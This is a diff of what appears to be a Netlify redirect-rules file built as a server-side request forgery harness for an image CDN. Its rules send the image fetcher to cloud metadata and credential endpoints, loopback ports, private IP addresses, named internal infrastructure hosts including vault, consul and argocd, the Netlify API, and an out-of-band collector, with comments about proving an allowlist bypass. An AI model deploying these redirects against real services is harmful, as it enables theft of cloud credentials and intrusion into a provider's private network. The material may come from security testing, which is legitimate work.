@@ -1,50 +1,40 @@
-/r/meta   http://169.254.169.254/latest/meta-data/          302
-/r/ecs    http://169.254.170.2/v2/credentials/              302
-/r/local  http://127.0.0.1/                                 302
-/r/env    http://envelope.services-prod.nsvcs.net/          302
-/r/consul http://consul.infra-prod.nsvcs.net:8500/v1/catalog/services 302
-/r/ok     https://www.netlify.com/favicon.ico               302
-/r/goog   https://www.google.com/favicon.ico                302
-/r/html   https://example.com/                              302
+# Redirect targets for the image-CDN test.
+# Per rail: external targets are Netlify-owned only. The google.com datapoint is
+# already captured and is not repeated. The "reachable but not an image" control
+# is now netlify.com/robots.txt instead of example.com.
 
-# --- controls: known-good, known-non-image, known-dead ---
-/i/pubimg   https://www.google.com/favicon.ico              302
-/i/pubhtml  https://example.com/                            302
-/i/nxdomain http://cherry-does-not-exist-zzz.invalid/       302
+# --- out-of-band collector, on my own site ---
+/r/oob      https://cherry-lane2-beta.netlify.app/.netlify/functions/oob   302
 
-# --- link-local / metadata ---
-/i/awsmeta  http://169.254.169.254/latest/meta-data/        302
-/i/awstok   http://169.254.169.254/latest/api/token         302
-/i/ecscred  http://169.254.170.2/v2/credentials/            302
-/i/gcpmeta  http://metadata.google.internal/computeMetadata/v1/  302
+# --- allowlist-bypass proof (netlify-owned target, NOT in remote_images) ---
+/r/ok       https://www.netlify.com/favicon.ico                302
+/r/nonimg   https://www.netlify.com/robots.txt                 302
 
-# --- loopback, several ports: closed vs filtered timing ---
-/i/lo80     http://127.0.0.1:80/                            302
-/i/lo22     http://127.0.0.1:22/                            302
-/i/lo8080   http://127.0.0.1:8080/                          302
-/i/lo9999   http://127.0.0.1:9999/                          302
+# --- multi-hop depth ---
+/r/hop1     /r/hop2                                            302
+/r/hop2     /r/hop3                                            302
+/r/hop3     https://www.netlify.com/favicon.ico                302
 
-# --- RFC1918 published by Netlify's own public DNS ---
-/i/envelope http://envelope.services-prod.nsvcs.net/        302
-/i/env443   https://envelope.services-prod.nsvcs.net/       302
-/i/consul   http://consul.infra-prod.nsvcs.net:8500/v1/status/leader  302
-/i/awx      https://awx.infra-prod.nsvcs.net/               302
-/i/shepherd https://shepherd.infra-prod.nsvcs.net/          302
-/i/net10    http://10.64.130.84/                            302
-/i/net1068  http://10.68.33.182:8500/v1/status/leader       302
-/i/hostnode http://172.16.27.1/                             302
-
-# --- in-scope infra that IS publicly routable: does the worker fetch it? ---
-/i/argofav  https://argocd.infra-prod.nsvcs.net/favicon.ico 302
-/i/vaultui  https://vault-releng.infra-prod.nsvcs.net/ui/   302
-/i/jigsaw   https://jigsaw.services-prod.nsvcs.net/         302
-/i/shepapi  https://shepherd-api.infra-prod.nsvcs.net/      302
-/i/cdnmon   https://cdn-monitor.services-prod.nsvcs.net/    302
-
-# --- can it reach the Netlify API itself, i.e. an authenticated-adjacent surface ---
-/i/apisite  https://api.netlify.com/api/v1/sites/62b5ca3e-8f63-4281-b766-e5649e789df8  302
-
-# --- multi-hop: does it follow more than one redirect? ---
-/i/hop1     /i/hop2                                         302
-/i/hop2     /i/hop3                                         302
-/i/hop3     https://www.google.com/favicon.ico              302
+# --- Netlify internal / infra reachability (their own hosts only) ---
+/i/awsmeta  http://169.254.169.254/latest/meta-data/           302
+/i/awstok   http://169.254.169.254/latest/api/token            302
+/i/ecscred  http://169.254.170.2/v2/credentials/               302
+/i/gcpmeta  http://metadata.google.internal/computeMetadata/v1/ 302
+/i/lo80     http://127.0.0.1:80/                               302
+/i/lo22     http://127.0.0.1:22/                               302
+/i/lo8080   http://127.0.0.1:8080/                             302
+/i/lo9999   http://127.0.0.1:9999/                             302
+/i/envelope http://envelope.services-prod.nsvcs.net/           302
+/i/env443   https://envelope.services-prod.nsvcs.net/          302
+/i/consul   http://consul.infra-prod.nsvcs.net:8500/v1/status/leader 302
+/i/awx      https://awx.infra-prod.nsvcs.net/                  302
+/i/shepherd https://shepherd.infra-prod.nsvcs.net/             302
+/i/net10    http://10.64.130.84/                               302
+/i/net1068  http://10.68.33.182:8500/v1/status/leader          302
+/i/hostnode http://172.16.27.1/                                302
+/i/argofav  https://argocd.infra-prod.nsvcs.net/favicon.ico    302
+/i/vaultui  https://vault-releng.infra-prod.nsvcs.net/ui/      302
+/i/jigsaw   https://jigsaw.services-prod.nsvcs.net/            302
+/i/shepapi  https://shepherd-api.infra-prod.nsvcs.net/         302
+/i/cdnmon   https://cdn-monitor.services-prod.nsvcs.net/       302
+/i/apisite  https://api.netlify.com/api/v1/sites/62b5ca3e-8f63-4281-b766-e5649e789df8 302
